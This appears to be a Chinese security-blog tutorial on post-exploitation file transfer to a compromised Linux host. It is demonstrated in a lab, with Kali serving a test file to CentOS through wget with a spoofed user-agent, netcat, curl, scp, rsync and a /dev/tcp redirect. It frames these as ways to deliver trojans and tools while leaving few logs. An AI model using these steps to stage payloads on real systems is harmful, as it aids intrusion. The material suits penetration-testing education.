后渗透是指已对目标服务器有shell交互后的操作，通常包含权限维持、提权、内网渗透、一键拿域控。

本篇文章主要讲解后渗透准备工作——下载文件的方式，文件可以是木马、工具等等（任意文件皆可），为了方便演示，文件为test.txt。

##  ** **准备工作****

首先需要架设服务器，将要下载的文件部署在服务器上，笔者用的服务器为Kali
Linux架设，ip地址是192.168.8.111，被控端是Centos，ip地址是192.168.8.112

![](https://image.3001.net/images/20200903/1599148655.jpg)

服务器端架设完成，后文会演示Linux许多的下载方法。

##  ** **下载文件****

### Wget

用于从网络上下载文件的一个工具（Linux自带，Windows需要去官网下载安装，与我们下载直接违背，所以Windows篇并没有提）

使用方法：

第一种——普通下载

wget http://192.168.8.111/test/test.txt

![](https://image.3001.net/images/20200903/1599148756.png)

第二种——伪造UA下载

首先来看一下正常下载的UA

![](https://image.3001.net/images/20200903/1599148794.png)

删掉test.txt文件重新下载，输入命令：

    
    
    wget --user-agent="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Safari/537.36" http://192.168.8.111/test/test.txt

![](https://image.3001.net/images/20200904/1599148846.png)

然后再查看Kali Linux的Wireshark捕获的数据包

![](https://image.3001.net/images/20200904/1599148876.png)

可以看到成功修改掉UA，其实wget还有许多功能，不过对于被控机进行下载不需要太多方式，只需要简单的下载即可，而且wget只有后台下载时才会产生日志文件，可以说是Linux中的一个下载神器

### NC

NetCat，功能很多就不介绍了，简要写下如何通过NC进行下载

使用方法：

Kali Linux端输入命令：nc -lvp 8888 < test.txt

![](https://image.3001.net/images/20200904/1599148938.png)

Centos端输入命令：

    
    
    nc 192.168.8.111 8888 > test.txt

![](https://image.3001.net/images/20200904/1599148972.png)

会显示空白，其实已经传输完成了，另起终端就可以查看

![](https://image.3001.net/images/20200904/1599149000.png)

然后只需要终端nc就可以了，在Kali Linux端可以看到传输

![](https://image.3001.net/images/20200904/1599149029.png)

### Curl

利用URL语法在命令行下工作的文件传输工具

使用方法：

Centos端输入命令：curl -O http://192.168.8.111/test/test.txt（注意：大写的o）

![](https://image.3001.net/images/20200904/1599149068.png)

可以看到下载成功，curl的功能如同wget一样，也可以进行修改UA，这里就不再演示

### SSH

建立在应用层基础上的安全协议，专为远程登录会话和其他网络服务提供安全性的协议

本次需要用到的是scp命令，scp是基于SSH登录进行安全的远程文件拷贝，所以需要确保SSH服务是正常运行的

输入命令：

    
    
    service sshd start

![](https://image.3001.net/images/20200904/1599149105.png)

可以看到是正常运行状态

使用方法：

第一种——本地复制到远程

在Kali Linx端输入命令：

    
    
    scp /var/www/html/test/test.txt root@192.168.8.112:/root

![](https://image.3001.net/images/20200904/1599149142.png)

第一次连接会询问无法检测远程主机的真实性，是否需要继续连接，输入yes即可，往后再次连接就不会询问

![](https://image.3001.net/images/20200904/1599149206.png)

第二种——将远程文件复制到本地

如果用Kali Linux做服务器的话，首先需要修改下配置文件（默认Kali Linx中SSH登录是禁用root用户的），输入命令：

    
    
    vim /etc/ssh/sshd_config，添加一条PermitRootLogin yes

![](https://image.3001.net/images/20200904/1599149237.png)

然后重启服务即可

![](https://image.3001.net/images/20200904/1599149262.png)

然后在Centos端输入命令：

    
    
    scp root@192.168.8.111:/var/www/html/test/test.txt /root

![](https://image.3001.net/images/20200904/1599149297.png)

### Rsync

Rsync是Linux系统中一个镜像备份工具，可以远程同步，文件复制，默认系统自带且运行

使用方法：

第一种——远程同步

在Kali Linux端输入命令：

    
    
    rsync -r /var/www/html/test （Kali Linux的目录）192.168.8.112:/var/www/html/（远程主机被同步的目录）

![](https://image.3001.net/images/20200904/1599149369.png)

在Centos端查看同步的目录

![](https://image.3001.net/images/20200904/1599149402.png)

可以看到整个目录都进行了同步

第二种——利用SSH

Kali Linux输入命令：

    
    
    rsync -av test.txt -e  ssh root@192.168.8.112:/root

![](https://image.3001.net/images/20200904/1599149440.png)

-e选项可以指定命令，所以说实际上是用SSH做的传输

![](https://image.3001.net/images/20200904/1599149469.png)

有趣的是Rsync还可以列出远程主机的目录，命令为：rsync
192.168.8.112:/var/www/html/，笔者曾在某项目驻场遇到过一台主机未授权访问Rsync，甚至可以直接进行同步，拿到一个高危

##  ** **总结****

可以说Linux的文件下载方式不是很多，当然也有一些其他方法笔者试验没有成功，比如通过cat test.txt >
/dev/tcp/192.168.8.112/8888传输就没有成功，不过按照理论上是可行的。

